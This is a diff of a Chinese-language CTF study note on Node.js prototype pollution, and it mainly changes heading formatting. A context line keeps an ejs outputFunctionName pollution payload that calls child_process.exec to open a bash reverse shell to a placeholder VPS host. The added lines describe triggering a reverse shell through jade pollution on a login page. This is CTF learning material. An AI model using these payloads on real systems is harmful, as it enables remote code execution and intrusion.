@@ -109,7 +109,7 @@ object2是object2['__proto__']， 就是{ ctfshow: "36dboy" }。此时 key为 ct
 
 ^
 ## **原型链污染组合**
-**ejs模板漏洞导致rce**
+#### **ejs模板漏洞导致rce**
 package.json中存在ejs
 ```
 {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/[vps-ip]/[port] 0>&1\"');var __tmp2"}}
@@ -120,7 +120,7 @@ package.json中存在ejs
 ```
 
 ^
-**污染函数Function创建的函数体，变成危险函数**
+#### **污染函数Function创建的函数体，变成危险函数**
 ```
 已知返回res.render('api', { query: Function(query)(query)});
 ```
@@ -170,3 +170,7 @@ req.body是入口，user.userinfo我们要通过这个污染Object,`userinfo` �
 ```
 
 
+
+^
+#### **jade原型链污染**
+在login页面打上去之后随便访问下，就会反弹。
